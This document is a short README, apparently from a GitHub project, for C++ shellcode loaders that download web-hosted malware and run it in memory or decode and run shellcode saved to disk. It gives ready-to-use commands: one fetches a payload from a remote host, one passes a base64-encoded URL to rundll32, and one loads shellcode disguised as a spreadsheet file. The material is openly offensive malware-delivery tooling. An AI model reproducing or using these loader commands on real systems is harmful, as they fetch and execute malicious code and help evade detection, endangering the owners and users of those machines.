# Ryan's Remote Loader
### RRLEXE and RRLDLL
Custom shellcode loader written in C++. This will grab your web hosted malware and run it in memory.
This project is password protected at this time.

![alt text](https://github.com/ryansisco/RyansRemoteLoader/blob/main/GIF.gif)

## Examples:
RRL.exe will take the remote bin file as a parameter like:
`RRL.exe http://10.0.0.54/pwn.bin`

This can also be run as a DLL using a base64 encoded parameter: 
`rundll32.exe RRLDLL.dll,Driver aHR0cDovLzEwLjAuMC41NC9wd24uYmluCg==`

# Ryan's Local Loader
### RLLDLL
Also written in C++, this will decode and execute your shellcode that was saved to disk.

## Examples:

`rundll32.exe RLLDLL.dll,Perform C:\Users\Brad\Downloads\Totally_Legit.xls`
